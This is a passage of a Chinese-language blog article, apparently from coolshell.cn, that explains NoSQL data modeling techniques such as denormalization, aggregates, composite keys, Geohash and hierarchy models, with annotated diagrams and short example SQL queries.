<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#6_%E9%99%8D%E7%BB%B4_Dimensionality_Reduction" title="(6) 降维 Dimensionality Reduction">(6) 降维 Dimensionality Reduction</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#7_%E7%B4%A2%E5%BC%95%E8%A1%A8_Index_Table" title="(7) 索引表 Index Table">(7) 索引表 Index Table</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#8_%E9%94%AE%E7%BB%84%E5%90%88%E7%B4%A2%E5%BC%95_Composite_Key_Index" title="(8) 键组合索引 Composite Key Index">(8) 键组合索引 Composite Key Index</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#9_%E9%94%AE%E7%BB%84%E5%90%88%E8%81%9A%E5%90%88_Aggregation_with_Composite_Keys" title="(9) 键组合聚合 Aggregation with Composite Keys">(9) 键组合聚合 Aggregation with Composite Keys</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#10_%E5%8F%8D%E8%BD%AC%E6%90%9C%E7%B4%A2_Inverted_Search_-_%E7%9B%B4%E6%8E%A5%E8%81%9A%E5%90%88_Direct_Aggregation" title="(10) 反转搜索 Inverted Search – 直接聚合 Direct Aggregation">(10) 反转搜索 Inverted Search – 直接聚合 Direct Aggregation</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-14" href="#%E5%B1%82%E7%BA%A7%E5%BC%8F%E6%A8%A1%E5%9E%8B_Hierarchy_Modeling_Techniques" title="层级式模型 Hierarchy Modeling Techniques">层级式模型 Hierarchy Modeling Techniques</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-15" href="#11_%E6%A0%91%E5%BD%A2%E8%81%9A%E5%90%88Tree_Aggregation" title="(11) 树形聚合Tree Aggregation">(11) 树形聚合Tree Aggregation</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-16" href="#12_%E9%82%BB%E6%8E%A5%E5%88%97%E8%A1%A8_Adjacency_Lists" title="(12) 邻接列表 Adjacency Lists">(12) 邻接列表 Adjacency Lists</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-17" href="#13_Materialized_Paths" title="(13) Materialized Paths">(13) Materialized Paths</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-18" href="#14_%E5%B5%8C%E5%A5%97%E9%9B%86_Nested_Sets" title="(14) 嵌套集 Nested Sets">(14) 嵌套集 Nested Sets</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-19" href="#15_%E5%B5%8C%E5%A5%97%E6%96%87%E6%A1%A3%E6%89%81%E5%B9%B3%E5%8C%96%EF%BC%9A%E6%9C%89%E9%99%90%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D_Nested_Documents_Flattening_Numbered_Field_Names" title="(15) 嵌套文档扁平化：有限的字段名 Nested Documents Flattening: Numbered Field Names">(15) 嵌套文档扁平化：有限的字段名 Nested Documents Flattening: Numbered Field Names</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-20" href="#16%E5%B5%8C%E5%A5%97%E6%96%87%E6%A1%A3%E6%89%81%E5%B9%B3%E5%8C%96%EF%BC%9A%E9%82%BB%E8%BF%91%E6%9F%A5%E8%AF%A2_Nested_Documents_Flattening_Proximity_Queries" title="(16)嵌套文档扁平化：邻近查询 Nested Documents Flattening: Proximity Queries">(16)嵌套文档扁平化：邻近查询 Nested Documents Flattening: Proximity Queries</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-21" href="#17_%E5%9B%BE%E7%BB%93%E6%9E%84%E6%89%B9%E5%A4%84%E7%90%86_Batch_Graph_Processing" title="(17) 图结构批处理 Batch Graph Processing">(17) 图结构批处理 Batch Graph Processing</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-22" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="_NoSQL_%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%E6%91%98%E8%A6%81"></span> NoSQL 数据模型摘要<span class="ez-toc-section-end"></span>
</h4>
<p>本文剩下的章节将向你介绍数据建模的技术实现和相关模式。但是，在介绍这些技术之前，先来一段序言：</p>
<ul>
<li>NoSQL 数据模型设计一般从业务应用的具体数据查询入手，而不是数据间的关系：</li>
<ul>
<li>关系型的数据模型基本上是分析数据间的结构和关系。其设计理念是： ”<strong>What answers do I have?”</strong><em> </em>
</li>
<li>NoSQL 数据模型基本上是从应用对数据的存取方式入手，如：我需要支持某种数据查询。其设计理念是<strong> ”What questions do I have?”</strong>
</li>
</ul>
</ul>
<ul>
<li>NoSQL 数据模型设计比关系型数据库需要对数据结构和算法的更深的了解。在这篇文章中我会和大家说那些尽人皆知的数据结构，这些数据结构并不只是被NoSQL使用，但是对于NoSQL的数据模型却非常有帮助。</li>
</ul>
<ul>
<li>数据冗余和反规格化是一等公民。</li>
</ul>
<ul>
<li>关系型数据库对于处理层级数据和图式数据非常的不方便。NoSQL用来解决图式数据明显是一个非常好的解决方案，几乎所有的NoSQL数据库可以很强地解决此类问题。这就是为什么这篇文章专门拿出一章来说明层级数据模型。</li>
</ul>
<div>下面是NoSQL的分类表，也是我用来写这篇文章时做实践的产品：</div>
<div>
<ul>
<li>Key-Value 存储: Oracle Coherence, Redis, Kyoto Cabinet</li>
<li>类BigTable存储: Apache HBase, Apache Cassandra</li>
<li>文档数据库: MongoDB, CouchDB</li>
<li>全文索引: Apache Lucene, Apache Solr</li>
<li>图数据库: neo4j, FlockDB</li>
</ul>
</div>
<h4>
<span class="ez-toc-section" id="%E6%A6%82%E5%BF%B5%E6%8A%80%E6%9C%AF_Conceptual_Techniques"></span>概念技术 Conceptual Techniques<span class="ez-toc-section-end"></span>
</h4>
<p>这一节主要介绍NoSQL数据模型的基本原则。</p>
<h5>
<span class="ez-toc-section" id="1_%E5%8F%8D%E8%A7%84%E6%A0%BC%E5%8C%96_Denormalization"></span>(1) 反规格化 Denormalization<span class="ez-toc-section-end"></span>
</h5>
<p>反规格化 Denormalization 可以被认为是把相同的数据拷贝到不同的文档或是表中，这样就可以简化和优化查询，或是正好适合用户的某中特别的数据模型。这篇文章中所说的绝大多数技术都或多或少地导向了这一技术。</p>
<p>总体来说，反规格化需要权衡下面这些东西：</p>
<ul>
<li>
<strong><em>查询数据量 /查询IO </em></strong> VS  <strong><em>总数据量</em></strong>。使用反规格化，一方面可以把一条查询语句所需要的所有数据组合起来放到一个地方存储。这意味着，其它不同不同查询所需要的相同的数据，需要放在别不同的地方。因此，这产生了很多冗余的数据，从而导致了数据量的增大。</li>
</ul>
<ul>
<li>
<strong><em>处理复杂度 </em></strong> VS <strong><em>总数据量</em></strong>. 在符合范式的数据模式上进行表连接的查询，很显然会增加了查询处理的复杂度，尤其对于分布式系统来说更是。反规格化的数据模型允许我们以方便查询的方式来存构造数据结构以简化查询复杂度。</li>
</ul>
<p><strong>适用性</strong>: Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>
<h5>
<span class="ez-toc-section" id="2_%E8%81%9A%E5%90%88_Aggregates"></span>(2) 聚合 Aggregates<span class="ez-toc-section-end"></span>
</h5>
<p>所有类型的NoSQL数据库都会提供灵活的Schema（数据结构，对数据格式的限制）：</p>
<ul>
<li>Key-Value Stores 和 Graph Databases 基本上来说不会Value的形式，所以Value可以是任意格式。这样一来，这使得我们可以任意组合一个业务实体的keys。比如，我们有一个用户帐号的业务实体，其可以被如下这些key组合起来： <em>UserID_name, UserID_email, UserID_messages</em> 等等。如果一个用户没有email或message，那么相应也不会有这样的记录。</li>
</ul>
<ul>
<li>BigTable 模型通过列集合来支持灵活的Schema，我们称之为列族（<em>column family</em>）。BigTable还可以在同一记录上出现不同的版本（通过时间戳）。</li>
</ul>
<ul>
<li>Document databases 文档数据库是一种层级式的“去Schema”的存储，虽然有些这样的数据库允许检验需要保存的数据是否满足某种Schema。</li>
</ul>
<p>灵活的Schema允许你可以用一种嵌套式的内部数据方式来存储一组有关联的业务实体（陈皓注：类似于JSON这样的数据封装格式）。这样可以为我们带来两个好处。</p>
<ul>
<li>最小化“一对多”关系——可以通过嵌套式的方式来存储实体，这样可以少一些表联结。</li>
</ul>
<ul>
<li>可以让内部技术上的数据存储更接近于业务实体，特别是那种混合式的业务实体。可能存于一个文档集或是一张表中。</li>
</ul>
<div>下图示意了这两种好处。图中描给了电子商务中的商品模型（陈皓注：我记得我在“<a title="挑战无处不在" href="https://coolshell.cn/articles/7048.html" target="_blank">挑战无处不在</a>”一文中说到过电商中产品分类数据库设计的挑战）</div>
<div>
<ul>
<li>首先，所有的商品Product都会有一个ID，Price 和 Description。</li>
</ul>
<ul>
<li>然后，我们可以知道不同的类型的商品会有不同的属性。比如，作者是书的属性，长度是牛仔裤的属性。其些属性可能是“一对多”或是“多对多”的关系，如：唱片中的曲目。</li>
</ul>
<ul>
<li>接下来，我们知道，某些业务实体不可能使用固定的类型。如：牛仔裤的属性并不是所有的牌子都有的，而且，有些名牌还会搞非常特别的属性。</li>
</ul>
<p>对于关系型数据库来说，要设计这样的数据模型并不简单，而且设计出来的绝对离优雅很远很远。而我们NoSQL中灵活的Schema允许你使用一个聚合 Aggregate (product) 可以建出所有不同种类的商品和他们的不同的属性：</p>
</div>
<div>
<div id="attachment_404">
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/soft-schema2.png"><img alt="image placeholder" ></a></p>
<p style="text-align: center;">Entity Aggregation</p>
</div>
</div>
<div>
<p>上图中我们可以比较关系型数据库和NoSQL的差别。<strong>但是我们可以看到在数据更新上，非规格化的数据存储在性能和一致性上会有很大的影响，这就是我们需要重点注意和不得不牺牲的地方</strong>。</p>
</div>
<p><strong>适用性</strong>: Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>
<h5>
<span class="ez-toc-section" id="3_%E5%BA%94%E7%94%A8%E5%B1%82%E8%81%94%E7%BB%93_Application_Side_Joins"></span>(3) 应用层联结 Application Side Joins<span class="ez-toc-section-end"></span>
</h5>
<p>表联结基本上不被NoSQL支持。正如我们前面所说的，NoSQL是“面向问题”而不是“面向答案”的，不支持表联结就是“面向问题”的后果。表的联结是在设计时被构造出来的，而不是在执行时建造出来的。所以，表联结在运行时是有很大开销的（陈皓注：搞过SQL表联结的都知道笛卡尔积是什么东西，大可以在参看以前酷壳的“<a title="图解SQL的Join" href="https://coolshell.cn/articles/3463.html" target="_blank">图解数据库表Joins</a>”），但是在使用了 Denormalization 和 Aggregates 技术后，我们基本不用进行表联结，如：你们使用嵌套式的数据实体。当然，如果你需要联结数据，你需要在应用层完成这个事。下面是几个主要的Use Case：</p>
<ul>
<li>多对多的数据实体关系——经常需要被连接或联结。</li>
</ul>
<ul>
<li>聚合 Aggregates 并不适用于数据字段经常被改变的情况。对此，我们需要把那些经常被改变的字段分到另外的表中，而在查询时我们需要联结数据。例如，我们有个Message系统可以有一个User实体，其包括了一个内嵌的Message实体。但是，如果用户不断在附加 message，那么，最好把message拆分到另一个独立的实体，但在查询时联结这User和Message这两个实体。如下图：</li>
</ul>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/05/aggregates-joins.png"><img alt="image placeholder" ></a></p>
<p><strong>适用性</strong>: Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库， Graph Databases 图数据库。</p>
<h4>
<span class="ez-toc-section" id="%E9%80%9A%E7%94%A8%E5%BB%BA%E6%A8%A1%E6%8A%80%E6%9C%AF_General_Modeling_Techniques"></span>通用建模技术 General Modeling Techniques<span class="ez-toc-section-end"></span>
</h4>
<p>在本书中，我们将讨论NoSQL中各种不同的通用的数据建模技术。</p>
<h5>
<span class="ez-toc-section" id="4_%E5%8E%9F%E5%AD%90%E8%81%9A%E5%90%88_Atomic_Aggregates"></span>(4) 原子聚合 Atomic Aggregates<span class="ez-toc-section-end"></span>
</h5>
<p>很多NoSQL的数据库（并不是所有）在事务处理上都是短板。在某些情况下，他们可以通过分布式锁技术或是<a title="Implementation of MVCC Transactions for Key-Value Stores" href="https://highlyscalable.wordpress.com/2012/01/07/mvcc-transactions-key-value/" target="_blank">应用层管理的MVCC技术</a>来实现其事务性（陈皓注：可参看本站的“<a title="多版本并发控制(MVCC)在分布式系统中的应用" href="https://coolshell.cn/articles/6790.html">多版本并发控制(MVCC)在分布式系统中的应用</a>”）但是，通常来说只能使用聚合Aggregates技术来保证一些ACID原则。</p>
<p>这就是为什么我们的关系型数据库需要有强大的事务处理机制——因为关系型数据库的数据是被规格化存放在了不同的地方。所以，Aggregates聚合允许我们把一个业务实体存成一个文档、存成一行，存成一个key-value，这样就可以原子式的更新了：</p>
<div id="attachment_409">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/atomic-aggregate1.png"><img alt="image placeholder" ><br>
</a>Atomic Aggregates</p>
</div>
<p>当然，原子聚合 Atomic Aggregates 这种数据模型并不能实现完全意义上的事务处理，但是如果支持原子性，锁，或 test-and-set 指令，那么， Atomic Aggregates 是可以适用的。</p>
<p><strong><strong>适用性</strong>: </strong>Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>
<h5>
<span class="ez-toc-section" id="5_%E5%8F%AF%E6%9E%9A%E4%B8%BE%E9%94%AE_Enumerable_Keys"></span>(5) 可枚举键 Enumerable Keys<span class="ez-toc-section-end"></span>
</h5>
<p>也许，对于无顺序的Key-Value最大的好处是业务实体可以被容易地hash以分区在多个服务器上。而排序了的key会把事情搞复杂，但是有些时候，一个应用能从排序key中获得很多好处，就算是数据库本身不提供这个功能。让我们来思考下email消息的数据模型：</p>
<ol>
<li>一些NoSQL的数据库提供原子计数器以允许生一些连续的ID。在这种情况下，我们可以使用 <em>userID_messageID</em> 来做为一个组合key。如果我们知道最新的message ID，就可以知道前一个message，也可能知道再前面和后面的Message。</li>
<li>Messages可以被打包。比如，每天的邮件包。这样，我们就可以对邮件按指定的时间段来遍历。</li>
</ol>
<p><strong><strong><strong>适用性</strong>: </strong></strong>Key-Value Store 键值对数据库<strong>。</strong></p>
<h5>
<span class="ez-toc-section" id="6_%E9%99%8D%E7%BB%B4_Dimensionality_Reduction"></span>(6) 降维 Dimensionality Reduction<span class="ez-toc-section-end"></span>
</h5>
<p>Dimensionality Reduction 降维是一种技术可以允许把一个多维的数据映射成一个Key-Value或是其它非多给的数据模型。</p>
<p>传统的地理位置信息系统使用一些如“四分树<a href="https://en.wikipedia.org/wiki/Quadtree" target="_blank">QuadTree</a>” 或 “<a href="https://en.wikipedia.org/wiki/R-tree" target="_blank">R-Tree</a>” 来做地理位置索引。这些数据结构的内容需要被在适当的位置更新，并且，如果数据量很大的话，操作成本会很高。另一个方法是我们可以遍历一个二维的数据结构并把其扁平化成一个列表。一个众所周知的例子是<a href="https://en.wikipedia.org/wiki/Geohash" target="_blank">Geohash</a>（地理哈希）。一个Geohash使用“之字形”的路线扫描一个2维的空间，而且遍历中的移动可以被简单地用0和1来表示其方向，然后在移动的过程中产生0/1串。下图展示了这一算法：（陈皓注：先把地图分成四份，经度为第一位，纬度为第二位，于是左边的经度是0，右边的是1，纬度也一样，上面是为1，下面的为0，这样，经纬度就可以组合成01，11，00，10这四个值，其标识了四块区域，我们可以如此不断的递归地对每个区域进行四分，然后可以得到一串1和0组成的字串，然后使用0-9，b-z 去掉（去掉a, i, l, o）这32个字母进行base32编码得到一个8个长度的编码，这就是Geohash的算法）</p>
<div id="attachment_398">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/geohash-traversal1.png"><img alt="image placeholder" ><br>
</a>Geohash Index</p>
</div>
<p>Geohash的最强大的功能是使用简单的位操作就可以知道两个区域间的距离，就像图中所示（陈皓：proximity框着的那两个，这个很像IP地址了）。Geohash把一个二维的坐标生生地变成了一个一维的数据模型，这就是降维技术。BigTable的降维技术参看到文章后面的 [6.1]。更多的关于Geohash和其它技术可以参看 [6.2] 和 [6.3]。</p>
<p><strong><strong><strong>适用性</strong>:</strong></strong> Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>
<h5>
<span class="ez-toc-section" id="7_%E7%B4%A2%E5%BC%95%E8%A1%A8_Index_Table"></span>(7) 索引表 Index Table<span class="ez-toc-section-end"></span>
</h5>
<p>Index Table 索引表是一个非常直白的技术，其可以你在不支持索引的数据库中得到索引的好处。BigTable是这类最重要的数据库。这需要我们维护一个有相应存取模式的特别表。例如，我们有一个主表存着用户帐号，其可以被UserID存取。某查询需要查出某个城市里所有的用户，于是我们可以加入一张表，这张表用城市做主键，所有和这个城市相关的UserID是其Value，如下所示：</p>
<div id="attachment_399">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/index-table.png"><img alt="image placeholder" ><br>
</a>Index Table Example</p>
</div>
<p>可见，城市索引表的需要和对主表用户表保持一致性，因此，主表的每一个更新可能需要对索引表进行更新，不然就是一个批处理更新。无论哪个方式，这都会损伤一些性能，因为需要保持一致性。</p>
<p>Index Table 索引表可以被认为是关系型数据库中的视图的等价物。</p>
<p><strong>适用性</strong>: BigTable 数据库。</p>
<h5>
<span class="ez-toc-section" id="8_%E9%94%AE%E7%BB%84%E5%90%88%E7%B4%A2%E5%BC%95_Composite_Key_Index"></span>(8) 键组合索引 Composite Key Index<span class="ez-toc-section-end"></span>
</h5>
<p>Composite key 键组合是一个很常用的技术，对此，当我们的数据库支持键排序时能得到极大的好处。Composite key组合键的拼接成为第二排序字段可以让你构建出一种多维索引，这很像我们之前说过的 Dimensionality Reduction 降维技术。例如，我们需要存取用户统计。如果我们需要根据不同的地区来统计用户的分布情况，我们可以把Key设计成这样的格式 <em>(State:City:UserID)</em>，这样一来，就使得我们可以通过State到City来按组遍历用户，特别是我们的NoSQL数据库支持在key上按区查询（如：BigTable类的系统）：</p>
<p></p>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">SELECT Values WHERE state="CA:*"
SELECT Values WHERE city="CA:San Francisco*"</pre>
<div id="attachment_477">
<p style="text-align: center;"><a href="https://highlyscalable.files.wordpress.com/2012/03/composite-key-index.png"><img alt="image placeholder" ><br>
</a>Composite Key Index</p>
</div>
<p><strong><strong>适用性</strong>: </strong>BigTable 数据库。</p>
<h5>
<span class="ez-toc-section" id="9_%E9%94%AE%E7%BB%84%E5%90%88%E8%81%9A%E5%90%88_Aggregation_with_Composite_Keys"></span>(9) 键组合聚合 Aggregation with Composite Keys<span class="ez-toc-section-end"></span>
</h5>
<p>Composite keys  键组合技术并不仅仅可以用来做索引，同样可以用来区分不用的类型的数据以支持数据分组。考虑一个例子，我们有一个海量的日志数组，这个日志记录了互联网上的用户的访问来源。我们需要计算从某一网站过来的独立访客的数量，在关系型数据库中，我们可能需要下面这样的SQL查询语句：</p>
<p><code data-enlighter-language="sql" class="EnlighterJSRAW">SELECT count(distinct(user_id)) FROM clicks GROUP BY site</code></p>
<p>我们可以在NoSQL中建立如下的数据模型：</p>
<div id="attachment_383">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/composite-key-collating1.png"><img alt="image placeholder" ><br>
</a>Counting Unique Users using Composite Keys</p>
</div>
<p>这样，我们就可以把数据按UserID来排序，我们就可以很容易把同一个用户的数据（一个用户并不会产生太多的event）进行处理，去掉那些重复的站点（使用hash table或是别的什么）。另一个可选的技术是，我们可以对每一个用户建立一个数据实体，然后把其站点来源追加到这个数据实体中，当然，这样一来，数据的更新在性能相比之下会有一定损失。</p>
<p><strong><strong>适用性</strong>:</strong> Ordered Key-Value Store 排序键值对数据库， BigTable风格的数据库。</p>
<p><strong><br>
</strong></p>
<h5>
<span class="ez-toc-section" id="10_%E5%8F%8D%E8%BD%AC%E6%90%9C%E7%B4%A2_Inverted_Search_-_%E7%9B%B4%E6%8E%A5%E8%81%9A%E5%90%88_Direct_Aggregation"></span>(10) 反转搜索 Inverted Search – 直接聚合 Direct Aggregation<span class="ez-toc-section-end"></span>
</h5>
<p>这个技术更多的是数据处理技术，而不是数据建模技术。尽管如此，这个技术还是会影响数据模型。这个技术最主要的想法是使用一个索引来找到满足某条件的数据，但是把数据聚合起需要使用全文搜索。还是让我们来说一个示例。还是用上面那个例子，我们有很多的日志，其中包括互联网用户和他们的访问来源。让我们假定每条记录都有一个UserID，还有用户的种类 (Men, Women, Bloggers, 等)，以及用户所在的城市，和访问过的站点。我们要干的事是，为每个用户种类找到满足某些条件（访问源，所在城市，等）的的独立用户。</p>
<p>很明显，我们需要搜索那些满足条件的用户，如果我们使用反转搜索，这会让我们把这事干得很容易，如： <em>{Category -&gt; [user IDs]}</em> 或 <em>{Site -&gt; [user IDs]}</em>。使用这样的索引， 我们可以取两个或多个UserID要的交集或并集（这个事很容易干，而且可以干得很快，如果这些UserID是排好序的）。但是，我们要按用户种类来生成报表会变得有点麻烦，因为我们用语句可能会像下面这样</p>
<p><code data-enlighter-language="sql" class="EnlighterJSRAW">SELECT count(distinct(user_id)) ... GROUP BY category</code></p>
<p>但这样的SQL很没有效率，因为category数据太多了。为了应对这个问题，我们可以建立一个直接索引 <em>{UserID -&gt; [Categories]}</em> 然后我们用它来生成报表：</p>
<div id="attachment_388">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/invert-direct1.png"><img alt="image placeholder" ><br>
</a>Counting Unique Users using Inverse and Direct Indexes</p>
</div>
<p>最后，我们需要明白，对每个UserID的随机查询是很没有效率的。我们可以通过批查询处理来解决这个问题。这意味着，对于一些用户集，我们可以进行预处理（不同的查询条件）。</p>
<p><strong>适用性</strong>: Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>
<h4>
<span class="ez-toc-section" id="%E5%B1%82%E7%BA%A7%E5%BC%8F%E6%A8%A1%E5%9E%8B_Hierarchy_Modeling_Techniques"></span>层级式模型 Hierarchy Modeling Techniques<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="11_%E6%A0%91%E5%BD%A2%E8%81%9A%E5%90%88Tree_Aggregation"></span>(11) 树形聚合Tree Aggregation<span class="ez-toc-section-end"></span>
</h5>
<p>树形或是任意的图（需反规格化）可以被直接打成一条记录或文档存放。</p>
<ul>
<li>当树形结构被一次性取出时这会非常有效率（如：我们需要展示一个blog的树形评论）</li>
<li>搜索和任何存取这个实体都会存在问题。</li>
<li>对于大多数NoSQL的实现来说，更新数据都是很不经济的（相比起独立结点来说）</li>
</ul>
<div id="attachment_381">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/tree-aggregation.png"><img alt="image placeholder" ><br>
</a>Tree Aggregation</p>
</div>
<p><strong>适用性</strong>: Key-Value 键值对数据库, Document Databases 文档数据库</p>
<h5>
<span class="ez-toc-section" id="12_%E9%82%BB%E6%8E%A5%E5%88%97%E8%A1%A8_Adjacency_Lists"></span>(12) 邻接列表 Adjacency Lists<span class="ez-toc-section-end"></span>
</h5>
<p>Adjacency Lists 邻接列表是一种图 – 每一个结点都是一个独立的记录，其包含了 所有的父结点或子结点。这样，我们就可以通过给定的父或子结点来进行搜索。当然，我们需要通过hop查询遍历图。这个技术在广度和深度查询，以及得到某个结点的子树上没有效率。</p>
<p><strong>适用性</strong>: Key-Value 键值对数据库, Document Databases 文档数据库</p>
<p><strong><br>
</strong></p>
<h5>
<span class="ez-toc-section" id="13_Materialized_Paths"></span>(13) Materialized Paths<span class="ez-toc-section-end"></span>
</h5>
<p>Materialized Paths 可以帮助避免递归遍历（如：树形结构）。这个技术也可以被认为是反规格化的一种变种。其想法是为每个结点加上父结点或子结点的标识属性，这样就可以不需要遍历就知道所有的后裔结点和祖先结点了：</p>
<div id="attachment_372">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/materialized-paths2.png"><img alt="image placeholder" ><br>
</a>Materialized Paths for eShop Category Hierarchy</p>
</div>
<p>这个技术对于全文搜索引擎来说非常有帮助，因为其可以允许把一个层级结构转成一个文档。上面的示图中我们可以看到所有的商品或<em>Men’s Shoes</em>下的子分类可以被一条很短的查询语句处理——只需要给定个分类名。</p>
<p>Materialized Paths 可以存储一个ID的集合，或是一堆ID拼出的字符串。后者允许你通过一个正则表达式来搜索一个特定的分支路径。下图展示了这个技术（分支的路径包括了结点本身）：</p>
<div id="attachment_377">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/materialized-paths-2.png"><img alt="image placeholder" ><br>
</a>Query Materialized Paths using RegExp</p>
</div>
<p><strong>适用性</strong>: Key-Value 键值对数据库, Document Databases 文档数据, Search Engines 搜索引擎</p>
<h5>
<span class="ez-toc-section" id="14_%E5%B5%8C%E5%A5%97%E9%9B%86_Nested_Sets"></span>(14) 嵌套集 Nested Sets<span class="ez-toc-section-end"></span>
</h5>
<p><a href="https://en.wikipedia.org/wiki/Nested_set_model">Nested sets</a> 嵌套集是树形结构的标准技术。它被广泛地用在了关系性数据库中，它完全地适用于 Key-Value 键值对数据库 和 Document Databases 文档数据库。这个技术的想法是把叶子结点存储成一个数组，并通过使用索引的开始和结束来映射每一个非叶子结点到一个叶子结点集，就如下图所示一样：</p>
<div id="attachment_360">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/nested-sets.png"><img alt="image placeholder" ><br>
</a>Modeling of eCommerce Catalog using Nested Sets</p>
</div>
<p>这样的数据结构对于immutable data不变的数据 有非常不错的效率，因为其点内存空间小，并且可以很快地找出所有的叶子结点而不需要树的遍历。尽管如此，在插入和更新上需要很高的性能成本，因为新的叶子结点需要大规模地更新索引。</p>
<p><strong>适用性</strong>: Key-Value Stores 键值数据库, Document Databases 文档数据库</p>
<h4>
<span class="ez-toc-section" id="15_%E5%B5%8C%E5%A5%97%E6%96%87%E6%A1%A3%E6%89%81%E5%B9%B3%E5%8C%96%EF%BC%9A%E6%9C%89%E9%99%90%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D_Nested_Documents_Flattening_Numbered_Field_Names"></span>(15) 嵌套文档扁平化：有限的字段名 Nested Documents Flattening: Numbered Field Names<span class="ez-toc-section-end"></span>
</h4>
<p>搜索引擎基本上来说和扁平文档一同工作，如：每一个文档是一个扁平的字段和值的例表。这种数据模型的用来把业务实体映射到一个文本文档上，如果你的业务实体有很复杂的内部结构，这可能会变得很有挑战。一个典型的挑战是把一个有层级的文档映映射出来。例如，文档中嵌套另一个文档。让我们看看下面的示例：</p>
<div id="attachment_363">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/nested-documents-1.png"><img alt="image placeholder" ><br>
</a>Nested Documents Problem</p>
</div>
<p>上面的每一个业务实体代码一种简历。其包括了人名和一个技能列表。我把这个层级文档映射成一个文本文档，一种方法是创建 <em>Skill</em> 和 <em>Level</em> 字段。这个模型可以通过技术或是等级来搜索一个人，而上图标注的那样的组合查询则会失败。（陈皓注：因为分不清Excellent是否是Math还是Poetry上的）</p>
<p>在引用中的 [4.6] 给出了一种解决方案。其为每个字段都标上数字 <em>Skill_i</em> 和 <em>Level_i</em>，这样就可以分开搜索每一个对（下图中使用了OR来遍历查找所有可能的字段）:</p>
<div id="attachment_365">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/nested-documents-3.png"><img alt="image placeholder" ><br>
</a>Nested Document Modeling using Numbered Field Names</p>
</div>
<p>这样的方式根本没有扩展性，对于一些复杂的问题来说只会让代码复杂度和维护工作变大。</p>
<p><strong>适用性</strong>: Search Engines 全文搜索</p>
<h5>
<span class="ez-toc-section" id="16%E5%B5%8C%E5%A5%97%E6%96%87%E6%A1%A3%E6%89%81%E5%B9%B3%E5%8C%96%EF%BC%9A%E9%82%BB%E8%BF%91%E6%9F%A5%E8%AF%A2_Nested_Documents_Flattening_Proximity_Queries"></span>(16)嵌套文档扁平化：邻近查询 Nested Documents Flattening: Proximity Queries<span class="ez-toc-section-end"></span>
</h5>
<p>在附录 [4.6]中给出了这个技术用来解决扁平层次文档。它用邻近的查询来限制可被查询的单词的范围。下图中，所有的技能和等级被放在一个字段中，叫 SkillAndLevel，查询中出现的 “Excellent” 和 “Poetry” 必需一个紧跟另一个：</p>
<div id="attachment_364">
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/05/nested-documents-2.png"><img alt="image placeholder" ><br>
</a>Nested Document Modeling using Proximity Queries</p>
</div>
<p>附录 [4.3] 中讲述了这个技术被用在Solr中的一个成功案例。</p>
<p><strong>适用性</strong>: Search Engines 全文搜索</p>
<h5>
<span class="ez-toc-section" id="17_%E5%9B%BE%E7%BB%93%E6%9E%84%E6%89%B9%E5%A4%84%E7%90%86_Batch_Graph_Processing"></span>(17) 图结构批处理 Batch Graph Processing<span class="ez-toc-section-end"></span>
</h5>
